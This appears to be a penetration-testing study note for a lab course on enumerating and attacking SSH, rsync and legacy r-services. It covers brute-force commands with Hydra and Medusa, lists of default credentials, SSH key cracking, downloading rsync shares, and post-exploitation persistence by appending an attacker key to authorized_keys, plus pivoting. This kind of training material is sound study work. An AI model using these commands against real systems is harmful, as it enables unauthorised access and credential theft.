---
tags: [module/footprinting, ssh, rsync, r-services, remote-access, level/advanced, practical]
---

# Linux Remote Management - Practical Application

## Complete Remote Management Enumeration Workflow

Phase 1: SSH Enumeration
Phase 2: Rsync Enumeration
Phase 3: R-Services Enumeration
Phase 4: Credential Attacks
Phase 5: Post-Exploitation

---

## Phase 1: SSH Enumeration

### Service Discovery

nmap -p22 -sV -sC 10.129.14.132

### SSH-Audit Deep Scan

./ssh-audit.py 10.129.14.132

### Detect Authentication Methods

ssh -v user@10.129.14.132 2>&1 | grep "Authentications that can continue"

### Force Password Authentication

ssh -v user@10.129.14.132 -o PreferredAuthentications=password

### Check for Specific Vulnerabilities

| CVE | Description | Check |
|-----|-------------|-------|
| CVE-2020-14145 | Information disclosure in handshake | Version < 8.5p1 |
| CVE-2016-6210 | User enumeration via timing | Timing attack |
| CVE-2018-15473 | User enumeration | Username validation |

### User Enumeration via Timing

Use Metasploit:
use auxiliary/scanner/ssh/ssh_enumusers
set rhosts 10.129.14.132
set USER_FILE /usr/share/wordlists/users.txt
run

### Brute Force with Hydra

hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.129.14.132

hydra -L users.txt -p password ssh://10.129.14.132

### SSH Key Extraction (if you get access)

~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/authorized_keys
~/.ssh/config
/etc/ssh/sshd_config

---

## Phase 2: Rsync Enumeration

### Service Discovery

nmap -sV -p873 10.129.14.132

### Manual Probe

nc -nv 10.129.14.132 873

Send: @RSYNCD: 31.0
Send: #list
Look for share names.

### List All Shares

rsync rsync://10.129.14.132/

### List Share Contents

rsync -av --list-only rsync://10.129.14.132/sharename

### Download Entire Share

rsync -av rsync://10.129.14.132/sharename ./local-dir/

### Download Specific Files

rsync -av rsync://10.129.14.132/sharename/secrets.yaml ./

### Upload Files (if writable)

rsync -av ./local-file.txt rsync://10.129.14.132/sharename/

### Rsync Over SSH

rsync -av -e ssh user@10.129.14.132:/remote/path/ ./local/

### Automate Rsync Enumeration

#!/bin/bash
HOST=$1
OUTPUT_DIR="rsync-enum-$HOST"
mkdir -p $OUTPUT_DIR

echo "[*] Getting share list..."
rsync rsync://$HOST/ > $OUTPUT_DIR/shares.txt

while read share; do
    echo "[*] Listing $share..."
    rsync -av --list-only rsync://$HOST/$share > "$OUTPUT_DIR/$share.txt" 2>/dev/null
done < $OUTPUT_DIR/shares.txt

echo "[*] Rsync enumeration complete."

---

## Phase 3: R-Services Enumeration

### Service Discovery

nmap -sV -p512,513,514 10.0.17.2

### Check for .rhosts or hosts.equiv

If you can read files:
cat /etc/hosts.equiv
cat ~/.rhosts

### Attempt rlogin

rlogin 10.0.17.2 -l htb-student

### Attempt rsh

rsh 10.0.17.2 -l htb-student "id"

### Attempt rexec

rexec -l htb-student -p password 10.0.17.2 "id"

### Spoof Trusted Host (if you have IP spoofing)

Use tools like spoof to pretend to be a trusted host.

### Gather User Information

rwho
rusers -al 10.0.17.5

### Sniff R-Services Traffic (if on same network)

sudo tcpdump -i eth0 port 512 or 513 or 514 -w r-services.pcap

---

## Phase 4: Credential Attacks

### SSH Brute Force Tools

| Tool | Command |
|------|---------|
| Hydra | hydra -L users.txt -P pass.txt ssh://10.129.14.132 |
| Medusa | medusa -h 10.129.14.132 -U users.txt -P pass.txt -M ssh |
| Ncrack | ncrack -p ssh -U users.txt -P pass.txt 10.129.14.132 |
| Metasploit | auxiliary/scanner/ssh/ssh_login |

### SSH Private Key Attacks

If you find an SSH key:

chmod 600 key
ssh -i key user@10.129.14.132

Crack encrypted key with ssh2john:
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt

### Password Re-use

Test credentials found elsewhere against SSH/rsync.

### Default Credentials to Try

| Service | Username | Password |
|---------|----------|----------|
| SSH | root | root |
| SSH | root | toor |
| SSH | admin | admin |
| SSH | user | user |
| SSH | test | test |

---

## Phase 5: Post-Exploitation

### After SSH Access

# Check sudo permissions
sudo -l

# Check for other SSH keys
find /home -name "id_rsa" 2>/dev/null
find /root -name "id_rsa" 2>/dev/null

# Check authorized_keys for persistence
cat ~/.ssh/authorized_keys

# Add your own key for persistence
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys

# Check SSH config for port forwarding
cat /etc/ssh/sshd_config | grep -i "allowtcpforwarding"

### SSH Tunneling/Pivoting

# Local port forwarding
ssh -L 8080:internal-host:80 user@10.129.14.132

# Remote port forwarding
ssh -R 8080:localhost:80 user@10.129.14.132

# Dynamic SOCKS proxy
ssh -D 9050 user@10.129.14.132

# SSH as proxy command in proxychains
proxychains nmap -sT -Pn internal-host

### SSH Escape Sequences

~. - terminate connection
~^Z - suspend connection
~# - list forwarded connections
~& - background SSH

### Rsync Post-Exploitation

If you can upload files:
- Upload web shell
- Upload SSH key
- Upload cron job

If you can download files:
- Grab config files
- Grab password files
- Grab database dumps

---

## Complete Enumeration Script

Save as remote-enum.sh:

#!/bin/bash
HOST=$1
OUTPUT_DIR="remote-enum-$HOST"
mkdir -p $OUTPUT_DIR

echo "[*] Starting remote services enumeration on $HOST"

echo "[*] SSH enumeration..."
nmap -p22 -sV -sC --script ssh-* $HOST -oN $OUTPUT_DIR/ssh-nmap.txt

echo "[*] Rsync enumeration..."
nmap -p873 -sV --script rsync-* $HOST -oN $OUTPUT_DIR/rsync-nmap.txt
rsync rsync://$HOST/ > $OUTPUT_DIR/rsync-shares.txt 2>/dev/null

echo "[*] R-services enumeration..."
nmap -p512,513,514 -sV $HOST -oN $OUTPUT_DIR/r-services.txt

echo "[*] Remote services enumeration complete. Check $OUTPUT_DIR/"

---

## Tool Comparison

| Tool | Purpose | Best For |
|------|---------|----------|
| ssh-audit | SSH security auditing | Configuration review |
| hydra | Brute forcing | Password attacks |
| rsync | File transfer | Data extraction |
| rlogin/rsh | Legacy access | Legacy environments |
| tcpdump | Traffic sniffing | Capturing plaintext |

---

## Key Takeaways

- SSH is secure but misconfigurations can weaken it
- Rsync can expose sensitive files without auth
- R-services are inherently insecure (plaintext)
- Always check for anonymous rsync shares
- SSH keys are better than passwords but need protection
- Password re-use is common across services
- R-services trust files (.rhosts) can allow no-auth access
- Always check SSH version for known vulnerabilities
- SSH port forwarding enables pivoting
- Document all discovered shares and credentials
